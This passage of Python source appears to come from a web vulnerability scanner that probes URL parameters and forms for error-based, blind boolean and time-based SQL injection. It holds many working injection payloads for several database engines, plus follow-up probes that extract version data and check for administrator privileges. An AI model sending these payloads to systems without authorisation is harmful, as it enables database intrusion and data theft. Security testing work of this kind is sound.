            return vulnerabilities
        
        # Test each parameter for SQL injection
        for param_name, param_values in query_params.items():
            # Skip security tokens
            if param_name.lower() in ['csrf', 'nonce', 'token']:
                continue
                
            # Use the first value of the parameter
            param_value = param_values[0] if param_values else ''
            
            # Test for error-based SQL injection
            error_vuln = await self._test_error_sqli(
                url, param_name, param_value, "url", semaphore
            )
            if error_vuln:
                vulnerabilities.append(error_vuln)
                # Skip blind testing if error-based vulnerability is found
                continue
            
            # Test for blind SQL injection (only if no error-based vulnerability is found)
            blind_vuln = await self._test_blind_sqli(
                url, param_name, param_value, "url", semaphore
            )
            if blind_vuln:
                vulnerabilities.append(blind_vuln)
        
        return vulnerabilities

    async def _test_error_sqli(self, url: str, param_name: str, param_value: str, 
                          location_type: str, semaphore: asyncio.Semaphore, 
                          method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for error-based SQL injection.
        
        Args:
            url: The URL to test
            param_name: The name of the parameter to test
            param_value: The original value of the parameter
            location_type: Where the parameter is located (url, form, header, etc.)
            semaphore: Semaphore for limiting concurrent requests
            method: HTTP method to use
            priority: Priority of the test
            
        Returns:
            Vulnerability if found, None otherwise
        """
        # Generate a unique test ID
        test_id = str(uuid.uuid4())[:8]
        cache_key = f"{url}:{param_name}:{test_id}"
        
        # Check if we've already tested this parameter for error-based SQLi
        if cache_key in self.tested_error_params:
            return None
            
        # Mark as tested for error-based SQLi
        self.tested_error_params.add(cache_key)
        
        # Select payloads based on the parameter context and value
        selected_payloads = self._select_error_sqli_payloads(url, param_name, param_value)
        
        async with semaphore:
            # First, get a baseline response to compare against
            baseline_response = await self._make_rate_limited_request(
                url,
                method=method,
                headers=self.headers,
                semaphore=None  # Already in a semaphore block
            )
            
            if not baseline_response:
                return None
                
            # Check if baseline already contains SQL errors (false positive prevention)
            baseline_content = baseline_response["text"]
            has_baseline_errors = any(re.search(pattern, baseline_content, re.IGNORECASE) 
                                    for pattern in self.sql_error_patterns)
            
            # Test each payload
            for payload in selected_payloads:
                try:
                    # Send the request with the payload
                    response = await self._send_payload_request(
                        url, param_name, payload, location_type, method
                    )
                    
                    if not response:
                        continue
                    
                    # Check if payload triggered a SQL error
                    response_text = response["text"]
                    
                    # Skip if the error pattern was also in the baseline (likely a false positive)
                    if has_baseline_errors and response_text == baseline_content:
                        continue
                    
                    # Look for SQL error patterns in the response
                    for pattern in self.sql_error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            # Identify the database type from the error message
                            dbms_type = self._identify_dbms_from_error(response_text)
                            dbms_info = f" ({dbms_type})" if dbms_type else ""
                            
                            # Extract the specific error message for evidence
                            error_match = re.search(r'[^\n\r]{0,100}' + pattern + r'[^\n\r]{0,100}', 
                                                  response_text, re.IGNORECASE)
                            error_evidence = error_match.group(0).strip() if error_match else "SQL error detected"
                            
                            # Determine confidence level based on error specificity
                            confidence = 100 if dbms_type else 85
                            
                            # Heuristic: Reduce confidence if the error text is extremely long
                            # (might be a false positive from a large page)
                            if len(error_evidence) > 500:
                                confidence -= 20
                                error_evidence = error_evidence[:250] + "..." + error_evidence[-250:]
                            
                            # Create vulnerability report
                            vulnerability = {
                                "id": str(uuid.uuid4()),
                                "name": f"SQL Injection{dbms_info}",
                                "description": f"SQL injection vulnerability detected in parameter '{param_name}'. "
                                            f"The application reveals SQL errors that can be exploited.",
                                "severity": "high",
                                "url": url,
                                "parameter": param_name,
                                "evidence": f"Payload: {payload}\nError: {error_evidence}",
                                "remediation": "Use parameterized queries or prepared statements. Validate and sanitize all user inputs."
                            }
                            
                            # Check if this might be a false positive using common heuristics
                            if self._check_false_positive(baseline_content, response_text, payload, param_value):
                                # Skip likely false positives
                                continue
                                
                            # For high-confidence detections, also try some follow-up attacks to confirm
                            # and gather more information about the vulnerability
                            if confidence > 80:
                                follow_up_info = await self._perform_follow_up_tests(
                                    url, param_name, param_value, dbms_type, location_type, method
                                )
                                if follow_up_info:
                                    vulnerability["additional_info"] = follow_up_info
                            
                            logger.info(f"Found error-based SQL injection: {url} (param: {param_name})")
                            return vulnerability
                except Exception as e:
                    logger.error(f"Error testing SQL injection on {url} (param: {param_name}): {str(e)}")
        
        return None
        
    def _select_error_sqli_payloads(self, url: str, param_name: str, param_value: str) -> List[str]:
        """
        Select error-based SQL injection payloads based on the context.
        
        Args:
            url: The URL being tested
            param_name: Parameter name
            param_value: Current parameter value
            
        Returns:
            List of selected payloads
        """
        payloads = []
        parsed_url = urlparse(url)
        path = parsed_url.path.lower()
        
        # Detect if the URL suggests a specific database or framework
        is_php = '.php' in path
        is_asp = '.asp' in path or '.aspx' in path
        is_jsp = '.jsp' in path or '.do' in path
        
        # Parameter name hints
        is_id_param = any(id_pattern in param_name.lower() for id_pattern in ['id', 'num', 'code', 'key'])
        is_search_param = any(search_pattern in param_name.lower() for search_pattern in ['search', 'query', 'find', 'filter'])
        is_user_param = any(user_pattern in param_name.lower() for user_pattern in ['user', 'name', 'email', 'login', 'account'])
        
        # Parameter value hints 
        is_numeric = param_value.isdigit()
        is_string = not is_numeric and len(param_value) > 0
        
        # Basic tests that work across all databases
        basic_payloads = [
            "'"
            "\"",
            "\\",
            "`;",
            "'--",
            "\"%",
            "';"
        ]
        payloads.extend(basic_payloads)
        
        # Add SQL syntax error tests (most reliable for error-based detection)
        payloads.extend([
            f"{param_value}'",
            f"{param_value}\"",
            f"{param_value}')",
            f"{param_value}\")",
            f"{param_value}'))",
            f"{param_value}\"))",
            f"{param_value}';",
            f"{param_value}\";"
        ])
        
        # Add more sophisticated payloads for different database types
        # MySQL specific tests
        if is_php or not (is_asp or is_jsp):  # PHP often uses MySQL
            mysql_payloads = [
                f"{param_value}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
                f"{param_value}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
                f"{param_value}' AND extractvalue(1, concat(0x7e, (SELECT @@version))) AND '1'='1",
                f"{param_value}' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1) AND '1'='1"
            ]
            payloads.extend(mysql_payloads)
        
        # SQL Server specific tests
        if is_asp:  # ASP often uses SQL Server
            mssql_payloads = [
                f"{param_value}' AND 1=CONVERT(int,(SELECT @@version)) AND '1'='1",
                f"{param_value}';IF 1=1 WAITFOR DELAY '0:0:1'--",
                f"{param_value}' AND 1=db_name()--",
                f"{param_value}' AND 1=(SELECT CAST(@@version as int))--"
            ]
            payloads.extend(mssql_payloads)
        
        # PostgreSQL specific tests
        if any(x in path for x in ['/api', '/data']):  # APIs often use PostgreSQL
            postgres_payloads = [
                f"{param_value}' AND 1=cast(version() as int) AND '1'='1",
                f"{param_value}' AND 1=cast(current_database() as int) AND '1'='1",
                f"{param_value}' AND 1=(SELECT current_database()) AND '1'='1"
            ]
            payloads.extend(postgres_payloads)
        
        # Oracle specific tests
        if any(x in path for x in ['/apex', '/ords', '/pls']):  # Oracle-specific paths
            oracle_payloads = [
                f"{param_value}' AND 1=UTL_INADDR.GET_HOST_NAME('invalid') AND '1'='1",
                f"{param_value}' AND 1=CTXSYS.DRITHSX.SN(1,1) AND '1'='1",
                f"{param_value}' AND 1=(SELECT banner FROM v$version WHERE rownum=1) AND '1'='1"
            ]
            payloads.extend(oracle_payloads)
        
        # Specific payloads based on parameter type
        if is_id_param and is_numeric:
            # Numeric ID parameters are most vulnerable to SQL injection
            id_payloads = [
                f"{param_value} AND 1=0 UNION ALL SELECT 1,2,3--",
                f"{param_value} AND 1=0 UNION ALL SELECT null,null,null--",
                f"{param_value}+1",
                f"(SELECT 1 FROM dual WHERE 1=1)",
                f"1 OR 1=1"
            ]
            payloads.extend(id_payloads)
        
        if is_search_param:
            # Search parameters often vulnerable to LIKE-based injections
            search_payloads = [
                f"{param_value}%' AND 1=0 UNION ALL SELECT 1,2,3--",
                f"{param_value}' UNION SELECT 1,2,3--",
                f"{param_value}%%' AND 1=1--"
            ]
            payloads.extend(search_payloads)
        
        if is_user_param:
            # User-related parameters often use additional validation
            user_payloads = [
                f"{param_value}' OR '1'='1",
                f"{param_value}' OR 'x'='x",
                f"{param_value}' OR username LIKE '%",
                f"{param_value}' /**/OR/**/1=1--"
            ]
            payloads.extend(user_payloads)
        
        # Add UNION-based probes that often cause errors
        payloads.extend([
            f"{param_value}' UNION ALL SELECT 1--",
            f"{param_value}' UNION ALL SELECT 1,2--",
            f"{param_value}' UNION ALL SELECT 1,2,3--"
        ])
        
        # Filter out duplicates and limit to a reasonable number to avoid too many requests
        unique_payloads = list(dict.fromkeys(payloads))  # Preserves order
        
        # Prioritize based on the parameter type (e.g., numeric IDs first)
        if is_id_param and is_numeric:
            unique_payloads = sorted(unique_payloads, key=lambda x: 0 if param_value in x and "UNION" in x else 1)
        
        return unique_payloads[:30]  # Limit to 30 payloads maximum
    
    def _check_false_positive(self, baseline: str, response: str, payload: str, original_value: str) -> bool:
        """
        Check if an error-based SQL injection finding might be a false positive.
        
        Args:
            baseline: Baseline response text
            response: Response text with potential SQL error
            payload: Payload that was used
            original_value: Original parameter value
            
        Returns:
            True if likely a false positive, False otherwise
        """
        # If the baseline and response are identical, it's a false positive
        if baseline == response:
            return True
            
        # If the payload appears literally in the response, might be a false positive
        # (websites sometimes echo the parameter value)
        payload_safe = re.escape(payload)
        if re.search(payload_safe, response, re.IGNORECASE):
            # Check if original value also appears (normal parameter reflection)
            if original_value and re.search(re.escape(original_value), baseline, re.IGNORECASE):
                # This is likely just standard parameter reflection, not SQLi
                return True
                
        # Check for common false positive scenarios where "SQL" appears in legitimate contexts
        false_positive_patterns = [
            r'SQL\s+tutorial',
            r'SQL\s+database',
            r'SQL\s+server',
            r'learn\s+SQL',
            r'SQL\s+query',
            r'SQL\s+\d+',
            r'SQL\s+basics',
            r'SQL\s+examples?',
            r'using\s+SQL',
            r'about\s+SQL',
            r'SQL\s+language',
            r'SQL\s+course',
            r'SQL\s+training'
        ]
        
        # If these appear in both baseline and response, likely false positive
        for pattern in false_positive_patterns:
            if re.search(pattern, baseline, re.IGNORECASE) and re.search(pattern, response, re.IGNORECASE):
                return True
                
        # Common false positives related to different HTTP status codes
        if '404 Not Found' in response and '404 Not Found' not in baseline:
            # Page not found error might contain technical details that match error patterns
            return True
            
        if '500 Internal Server Error' in response and '500 Internal Server Error' not in baseline:
            # Only if the 500 error doesn't contain SQL-specific errors
            # Check if actual SQL details are exposed in the error
            if not any(re.search(r'(mysql|sqlstate|syntax|oracle|sql\s+server)', response, re.IGNORECASE)
                     for pattern in self.sql_error_patterns):
                return True
                
        return False
        
    async def _perform_follow_up_tests(self, url: str, param_name: str, param_value: str, 
                               dbms_type: str, location_type: str, method: str) -> Optional[Dict[str, Any]]:
        """
        Perform follow-up tests to confirm SQL injection and gather additional information.
        
        Args:
            url: Target URL
            param_name: Vulnerable parameter
            param_value: Original parameter value
            dbms_type: Identified database type
            location_type: Parameter location type
            method: HTTP method
            
        Returns:
            Additional information if gathered, None otherwise
        """
        # Additional information to return
        follow_up_info = {}
        
        # Select follow-up payloads based on the database type
        db_version_payloads = {
            "MySQL": [
                f"{param_value}' UNION SELECT @@version,NULL,NULL-- ",
                f"{param_value}' UNION SELECT version(),NULL,NULL-- "
            ],
            "PostgreSQL": [
                f"{param_value}' UNION SELECT version(),NULL,NULL-- ",
                f"{param_value}' UNION SELECT current_setting('server_version'),NULL,NULL-- "
            ],
            "Microsoft SQL Server": [
                f"{param_value}' UNION SELECT @@version,NULL,NULL-- ",
                f"{param_value}' UNION SELECT SERVERPROPERTY('productversion'),NULL,NULL-- "
            ],
            "Oracle": [
                f"{param_value}' UNION SELECT banner FROM v$version WHERE rownum=1,NULL,NULL FROM dual-- ",
                f"{param_value}' UNION SELECT banner,NULL,NULL FROM v$version WHERE rownum=1-- "
            ],
            "SQLite": [
                f"{param_value}' UNION SELECT sqlite_version(),NULL,NULL-- "
            ],
            "": [  # Generic, DB type unknown
                f"{param_value}' UNION SELECT NULL,NULL,NULL-- ",
                f"{param_value}' UNION SELECT 1,2,3-- "
            ]
        }
        
        # Use the correct payloads based on DB type, falling back to generic if not found
        version_payloads = db_version_payloads.get(dbms_type, db_version_payloads[""])
        
        # Try to get database version or other useful info
        for payload in version_payloads:
            try:
                response = await self._send_payload_request(
                    url, param_name, payload, location_type, method
                )
                
                if response and response.get("text"):
                    # Look for common version formats in the response
                    version_patterns = [
                        r'(\d+\.\d+\.\d+[\.\-\w]*)',  # General version format
                        r'mysql[\s-]*(ver\s*\d+(\.\d+)+|version[\s:]*\d+\.\d+(\.\d+)*)',  # MySQL
                        r'postgresql[\s-]*(ver\s*\d+\.\d+(\.\d+)*|version[\s:]*\d+\.\d+(\.\d+)*)',  # PostgreSQL
                        r'microsoft sql server[\s\-]*(ver\s*\d+|version[\s:]*\d+(\.\d+)*)',  # MSSQL
                        r'oracle database[\s\-]*(ver\s*\d+|version[\s:]*\d+(\.\d+)*)',  # Oracle
                        r'sqlite[\s\-]*(ver\s*\d+|version[\s:]*\d+(\.\d+)*)'  # SQLite
                    ]
                    
                    for pattern in version_patterns:
                        match = re.search(pattern, response["text"], re.IGNORECASE)
                        if match:
                            follow_up_info["version"] = match.group(0)
                            break
                    
                    # If we found version information, stop trying additional payloads
                    if "version" in follow_up_info:
                        break
            except Exception:
                continue
        
        # Try to determine if the user has administrative privileges
        admin_payloads = {
            "MySQL": [
                f"{param_value}' AND (SELECT super_priv FROM mysql.user WHERE user=current_user()) = 'Y'-- "
            ],
            "PostgreSQL": [
                f"{param_value}' AND (SELECT current_setting('is_superuser')) = 'on'-- "
            ],
            "Microsoft SQL Server": [
                f"{param_value}' AND (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1-- "
            ]
        }
        
        # Only try if we know the DB type
        if dbms_type in admin_payloads:
            for payload in admin_payloads[dbms_type]:
                try:
                    response = await self._send_payload_request(
                        url, param_name, payload, location_type, method
                    )
                    
                    # Check if response is different from error responses
                    # If it doesn't error, the condition might be true
                    if response and response.get("status") == 200:
                        if not any(re.search(pattern, response["text"], re.IGNORECASE) 
                                  for pattern in self.sql_error_patterns):
                            follow_up_info["admin_privileges"] = "Possible"
                            break
                except Exception:
                    continue
        
        return follow_up_info if follow_up_info else None
    
    async def _test_blind_sqli(self, url: str, param_name: str, param_value: str, 
                          location_type: str, semaphore: asyncio.Semaphore, 
                          method: str = "get", priority: float = 1.0) -> Optional[Dict[str, Any]]:
        """
        Test a parameter for blind SQL injection vulnerabilities.
        
        Args:
            url: The URL to test
            param_name: The name of the parameter to test
            param_value: The original value of the parameter
            location_type: Where the parameter is located (url, form, header, etc.)
            semaphore: Semaphore for limiting concurrent requests
            method: HTTP method to use
            priority: Priority of the test
            
        Returns:
            Vulnerability if found, None otherwise
        """
        test_id = str(uuid.uuid4())[:8]  # Generate a unique test ID
        cache_key = f"{url}:{param_name}:{test_id}"
        
        # Check if we've already tested this parameter for blind SQLi
        if cache_key in self.tested_blind_params:
            return None
            
        # Mark as tested for blind SQLi
        self.tested_blind_params.add(cache_key)
        
        # Boolean-based detection setup
        boolean_payloads = self._generate_boolean_test_payloads(param_value)
        
        async with semaphore:
            # First, establish a baseline response (what the page normally returns)
            try:
                baseline_response = await self._make_rate_limited_request(
                    url,
                    method=method,
                    headers=self.headers,
                    semaphore=None  # Already in a semaphore block
                )
                
                if not baseline_response:
                    return None
                    
                baseline_content = baseline_response["text"]
                baseline_content_length = len(baseline_content)
                baseline_status = baseline_response["status"]
                baseline_response_time = baseline_response.get("elapsed", 0.5)
                
                # Extract key identifying elements from the baseline response
                # This helps with more accurate comparison for boolean-based detection
                baseline_fingerprint = self._generate_response_fingerprint(baseline_content)
                
                # Boolean-based blind SQL injection detection (most reliable)
                boolean_results = []
                
                # Test pairs of boolean payloads (one true, one false)
                for i in range(0, len(boolean_payloads), 2):
                    if i+1 >= len(boolean_payloads):
                        continue
                        
                    true_payload = boolean_payloads[i]
                    false_payload = boolean_payloads[i+1]
                    
                    # Skip if the payloads aren't a proper true/false pair
                    if true_payload.get("expected_result") != True or false_payload.get("expected_result") != False:
                        continue
                        
                    # Test the TRUE condition payload
                    true_response = await self._send_payload_request(
                        url, param_name, true_payload["payload"], location_type, method
                    )
                    
                    if not true_response:
                        continue
                        
                    # Test the FALSE condition payload
                    false_response = await self._send_payload_request(
                        url, param_name, false_payload["payload"], location_type, method
                    )
                    
                    if not false_response:
                        continue
                        
                    # Compare the responses to the true and false conditions
                    true_content = true_response["text"]
                    false_content = false_response["text"]
                    
                    # Generate fingerprints for the test responses
                    true_fingerprint = self._generate_response_fingerprint(true_content)
                    false_fingerprint = self._generate_response_fingerprint(false_content)
                    
                    # Check for differences that suggest successful SQL injection
                    if (
                        # Most reliable: True matches baseline but false doesn't
                        (self._similarity_score(baseline_fingerprint, true_fingerprint) > 0.8 and
                         self._similarity_score(baseline_fingerprint, false_fingerprint) < 0.6) or
                        
                        # Or: True and false responses are significantly different from each other
                        (self._similarity_score(true_fingerprint, false_fingerprint) < 0.7 and
                         abs(len(true_content) - len(false_content)) > 50) or
                         
                        # Or: Status codes differ in an expected way
                        (true_response["status"] == baseline_status and false_response["status"] != baseline_status)
                    ):
                        # Found a potential boolean-based SQLi!
                        boolean_results.append({
                            "true_payload": true_payload["payload"],
                            "false_payload": false_payload["payload"],
                            "difference_score": 1 - self._similarity_score(true_fingerprint, false_fingerprint),
                            "baseline_match": self._similarity_score(baseline_fingerprint, true_fingerprint)
                        })
                
                # If boolean-based SQLi found, report it
                if boolean_results:
                    best_result = max(boolean_results, key=lambda x: x["difference_score"])
                    
                    # Create vulnerability report
                    vulnerability = {
                        "id": str(uuid.uuid4()),
                        "name": "Blind Boolean-based SQL Injection",
                        "description": f"A blind boolean-based SQL injection vulnerability was detected in parameter '{param_name}'. "
                                    f"The application responds differently to logically equivalent statements.",
                        "severity": "high",
                        "url": url,
                        "parameter": param_name,
                        "evidence": f"TRUE payload: {best_result['true_payload']}, FALSE payload: {best_result['false_payload']}",
                        "remediation": "Parameterize queries, use prepared statements, or apply proper input validation and escaping."
                    }
                    
                    logger.info(f"Found boolean-based blind SQL injection: {url} (param: {param_name})")
                    return vulnerability
                
                # If boolean-based detection failed, try time-based SQLi
                # Prepare database-specific payloads
                time_delay = 5  # seconds to delay for time-based tests
                
                # Structured time-based payloads for different database types
                time_based_payloads = {
                    "mysql": [
                        f"{param_value}' AND SLEEP({time_delay}) -- ",
                        f"{param_value}\" AND SLEEP({time_delay}) -- ",
                        f"{param_value}') AND SLEEP({time_delay}) -- ",
                        f"{param_value}\") AND SLEEP({time_delay}) -- ",
                        f"{param_value} AND SLEEP({time_delay}) -- "
                    ],
                    "postgresql": [
                        f"{param_value}' AND (SELECT pg_sleep({time_delay})) -- ",
                        f"{param_value}\" AND (SELECT pg_sleep({time_delay})) -- ",
                        f"{param_value}') AND (SELECT pg_sleep({time_delay})) -- ",
                        f"{param_value}\") AND (SELECT pg_sleep({time_delay})) -- ",
                        f"{param_value} AND (SELECT pg_sleep({time_delay})) -- "
                    ],
                    "mssql": [
                        f"{param_value}' WAITFOR DELAY '0:0:{time_delay}' -- ",
                        f"{param_value}\" WAITFOR DELAY '0:0:{time_delay}' -- ",
                        f"{param_value}') WAITFOR DELAY '0:0:{time_delay}' -- ",
                        f"{param_value}\") WAITFOR DELAY '0:0:{time_delay}' -- ",
                        f"{param_value} WAITFOR DELAY '0:0:{time_delay}' -- "
                    ],
                    "oracle": [
                        f"{param_value}' AND DBMS_PIPE.RECEIVE_MESSAGE('XYZ',{time_delay}) -- ",
                        f"{param_value}\" AND DBMS_PIPE.RECEIVE_MESSAGE('XYZ',{time_delay}) -- ",
                        f"{param_value}') AND DBMS_PIPE.RECEIVE_MESSAGE('XYZ',{time_delay}) -- ",
                        f"{param_value}\") AND DBMS_PIPE.RECEIVE_MESSAGE('XYZ',{time_delay}) -- ",
                        f"{param_value} AND DBMS_PIPE.RECEIVE_MESSAGE('XYZ',{time_delay}) -- "
                    ],
                    "sqlite": [
                        f"{param_value}' AND RANDOMBLOB(100000000) -- ",
                        f"{param_value}\" AND RANDOMBLOB(100000000) -- ",
                        f"{param_value}') AND RANDOMBLOB(100000000) -- ",
                        f"{param_value}\") AND RANDOMBLOB(100000000) -- ",
                        f"{param_value} AND RANDOMBLOB(100000000) -- "
                    ]
                }
                
                # Try each database type's time-based payloads
                for db_type, payloads in time_based_payloads.items():
                    for payload in payloads:
                        # Check for time delay
                        start_time = time.time()
                        delay_response = await self._send_payload_request(
                            url, param_name, payload, location_type, method
                        )
                        elapsed_time = time.time() - start_time
                        
                        # Allow for some network/server variability
                        # Time-based detection is reliable when response takes longer than baseline * 2 and exceeds our delay
                        if delay_response and elapsed_time > max(baseline_response_time * 2, time_delay * 0.8):
                            # Found time-based SQLi!
                            vulnerability = {
                                "id": str(uuid.uuid4()),
                                "name": f"Blind Time-based SQL Injection ({db_type.upper()})",
                                "description": f"A blind time-based SQL injection vulnerability was detected in parameter '{param_name}'. "
                                            f"The application response was delayed by approximately {elapsed_time:.2f} seconds.",
                                "severity": "high",
                                "url": url,
                                "parameter": param_name,
                                "evidence": f"Payload: {payload}, Delay: {elapsed_time:.2f}s vs baseline: {baseline_response_time:.2f}s",
                                "remediation": "Parameterize queries, use prepared statements, or apply proper input validation and escaping."
                            }
                            
                            logger.info(f"Found time-based blind SQL injection ({db_type}): {url} (param: {param_name})")
                            return vulnerability
                
                # If still nothing found, try generic heavy queries that might cause detectable delays
                # These work across different database systems
                heavy_payloads = [
                    f"{param_value}' AND (SELECT count(*) FROM all_users t1, all_users t2, all_users t3) > 0 -- ",
                    f"{param_value}' AND (WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 100) SELECT count(*) FROM t) > 0 -- ",
                    f"{param_value}' AND (SELECT count(*) FROM generate_series(1,10000)) > 0 -- "
                ]
                
                for payload in heavy_payloads:
                    start_time = time.time()
                    delay_response = await self._send_payload_request(
                        url, param_name, payload, location_type, method
                    )
                    elapsed_time = time.time() - start_time
                    
                    if delay_response and elapsed_time > baseline_response_time * 3:
                        # Found likely SQLi through heavy query
                        vulnerability = {
                            "id": str(uuid.uuid4()),
                            "name": "Blind SQL Injection (Heavy Query)",
                            "description": f"A blind SQL injection vulnerability was detected in parameter '{param_name}'. "
                                        f"The application response was delayed significantly with a computationally expensive query.",
                            "severity": "high",
                            "url": url,
                            "parameter": param_name,
                            "evidence": f"Payload: {payload}, Delay: {elapsed_time:.2f}s vs baseline: {baseline_response_time:.2f}s",
                            "remediation": "Parameterize queries, use prepared statements, or apply proper input validation and escaping."
                        }
                        
                        logger.info(f"Found blind SQL injection (heavy query): {url} (param: {param_name})")
                        return vulnerability
            except Exception as e:
                logger.error(f"Error testing blind SQLi on {url} (param: {param_name}): {str(e)}")
        
        return None
    
    def _generate_response_fingerprint(self, content: str) -> str:
        """
        Generate a fingerprint from page content for blind SQLi comparison.
        Extracts stable elements while ignoring volatile content.
        
        Args:
            content: HTML content to fingerprint
            
        Returns:
            String representation of the page fingerprint
        """
        # Use BeautifulSoup to parse content
        try:
            soup = BeautifulSoup(content, 'html.parser')
            
            # Remove volatile elements
            for tag in soup.find_all(['script', 'noscript', 'style']):
                tag.decompose()
                
            # Extract key structural elements
            headings = [h.get_text()[:50] for h in soup.find_all(['h1', 'h2', 'h3'])]
            titles = [t.get_text()[:50] for t in soup.find_all('title')]
            meta = [m.get('content', '')[:30] for m in soup.find_all('meta') if m.get('content')]
            
            # Get common UI elements
            nav_items = [n.get_text()[:20] for n in soup.find_all(['nav', 'header', 'footer'])]
            
            # Main content text - limited to avoid overflow
            paragraphs = [p.get_text()[:50] for p in soup.find_all('p')[:5]]
            
            # For non-HTML responses or if parsing fails
            if not (headings or titles or paragraphs):
                # Take snippets of content for fingerprinting
                snippets = [content[i:i+50] for i in range(0, min(500, len(content)), 100)]
                return "||".join(snippets)
                
            # Combine elements into a fingerprint
            fingerprint_parts = headings + titles + meta + nav_items + paragraphs
            return "||".join(fingerprint_parts)
            
        except Exception:
            # Fallback for non-HTML content or parsing errors
            if len(content) > 500:
                return content[:200] + content[-200:]
            return content
    
    def _similarity_score(self, str1: str, str2: str) -> float:
        """
        Calculate similarity between two strings for blind SQLi detection.
        Uses both length comparison and content similarity.
        
        Args:
            str1: First string to compare
            str2: Second string to compare
            
        Returns:
            Similarity score between 0 and 1
        """
        if not str1 or not str2:
            return 0.0
            
        # Quick length-based filtering
        length_ratio = min(len(str1), len(str2)) / max(len(str1), len(str2))
        if length_ratio < 0.5:  # Very different lengths
            return length_ratio * 0.5  # Heavily penalize length differences
            
        # Simple common substring-based similarity for performance
        common_chars = sum(1 for c1, c2 in zip(str1, str2) if c1 == c2)
        max_length = max(len(str1), len(str2))
        if max_length == 0:
            return 1.0
            
        common_ratio = common_chars / max_length
        
        # Combine length and content similarity
        return (length_ratio * 0.4) + (common_ratio * 0.6)
    
    async def _send_payload_request(self, url: str, param_name: str, payload: str, 
                              location_type: str, method: str) -> Optional[Dict[str, Any]]:
        """
        Send a request with a SQL injection payload.
        
        Args:
            url: Target URL
            param_name: Parameter name to inject
            payload: The payload to inject
            location_type: Where the parameter is located (url, form, header, etc.)
            method: HTTP method to use
            
        Returns:
            Response data if successful, None otherwise
        """
        try:
            parsed_url = urlparse(url)
            
            if location_type == "url":
                # Parse existing query parameters
                query_params = parse_qs(parsed_url.query)
                
                # Clone and modify parameters
                modified_params = {k: v.copy() if isinstance(v, list) else v for k, v in query_params.items()}
                modified_params[param_name] = [payload]
                
                # Rebuild the query string
                modified_query = urlencode(modified_params, doseq=True)
                
                # Rebuild the URL
                modified_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    modified_query,
                    ''  # No fragment
                ))
                
                # Make the request
                response = await self._make_rate_limited_request(
                    modified_url,
                    method=method,
                    headers=self.headers,
                    semaphore=None  # Already in a semaphore block
                )
                
                return response
                
            elif location_type == "form":
                # For form parameters, send as form data
                form_data = {param_name: payload}
                
                response = await self._make_rate_limited_request(
                    url,
                    method=method,
                    data=form_data,
                    headers=self.headers,
                    semaphore=None
                )
                
                return response
                
            elif location_type == "header":
                # For header parameters, modify headers
                custom_headers = self.headers.copy()
                custom_headers[param_name] = payload
                
                response = await self._make_rate_limited_request(
                    url,
                    method=method,
                    headers=custom_headers,
                    semaphore=None
                )
                
                return response
                
            elif location_type == "json":
                # For JSON parameters, send as JSON data
                json_data = {param_name: payload}
                
                response = await self._make_rate_limited_request(
                    url,
                    method=method,
                    json_data=json_data,
                    headers=self.headers,
                    semaphore=None
                )
                
                return response
                
            # Default: return None for unsupported location types
            return None
            
        except Exception as e:
            logger.debug(f"Error sending payload request: {str(e)}")
            return None
    
    async def _check_forms(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Check HTML forms for SQL injection vulnerabilities.
        
        Args:
            url: The URL to check
            semaphore: Semaphore for limiting concurrent requests
            
        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []
        hostname = urlparse(url).netloc
        
        # Ensure domain_throttling is initialized
        if not hasattr(self, 'domain_throttling'):
            self.domain_throttling = defaultdict(int)
        
        # Fetch the page to extract forms
        async with semaphore:
            await self._apply_rate_limiting(hostname)
            
            try:
                # Try both standard and AJAX headers in case the server behaves differently
                standard_headers = self.headers.copy()
                ajax_headers = self.headers.copy()
                ajax_headers['X-Requested-With'] = 'XMLHttpRequest'
                
                # First try with standard headers
                response = await self._make_rate_limited_request(
                    url,
                    method="GET",
                    headers=standard_headers,
                    semaphore=None  # Already in a semaphore block
                )
                
                if not response or response.get("status") != 200:
                    # Try with AJAX headers if standard failed
                    response = await self._make_rate_limited_request(
                        url,
                        method="GET",
                        headers=ajax_headers,
                        semaphore=None
                )
                
                if not response or response.get("status") != 200:
                    return vulnerabilities
                    
                # Parse the HTML content to find forms
                html_content = response.get("text", "")
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Find all forms in the page
                forms = soup.find_all('form')
                
                if forms:
                    logger.info(f"Found {len(forms)} forms on {url}")
                    
                    # Base URL for resolving relative URLs
                    base_url = response.get("url", url)
                    
                    # Test each form for SQL injection
                    for form_index, form in enumerate(forms):
                        form_method = form.get('method', 'get').lower()
                        form_action = form.get('action', '')
                        
                        # Handle relative URLs
                        if form_action:
                            if not form_action.startswith(('http://', 'https://')):
                                form_action = urljoin(base_url, form_action)
                        else:
                            # If no action, the form submits to the current URL
                            form_action = base_url
                        
                        # Extract all input fields, including hidden ones
                        inputs = form.find_all(['input', 'textarea', 'select'])
                        
                        # Create a dictionary of form fields and default values
                        form_data = {}
                        injectable_fields = []
                        
                        for input_field in inputs:
                            field_type = input_field.get('type', 'text').lower()
                            field_name = input_field.get('name', '')
                            
                            # Skip fields without names or submit/button types
                            if not field_name or field_type in ['submit', 'button', 'image', 'reset']:
                                continue
                            
                            # Skip CSRF tokens and other security fields but capture their values
                            # to be able to submit the form successfully
                            if any(token in field_name.lower() for token in ['csrf', 'token', 'nonce', 'captcha']):
                                form_data[field_name] = input_field.get('value', '')
                                continue
                                
                            # Get the default value of the field
                            field_value = input_field.get('value', '')
                            
                            # For select elements, get the selected option
                            if input_field.name == 'select':
                                selected_option = input_field.find('option', selected=True)
                                if selected_option:
                                    field_value = selected_option.get('value', '')
                                else:
                                    # Get the first option if no option is selected
                                    first_option = input_field.find('option')
                                    if first_option:
                                        field_value = first_option.get('value', '')
                            
                            # Generate appropriate test values based on field type
                            if field_type == 'number' or field_type == 'range':
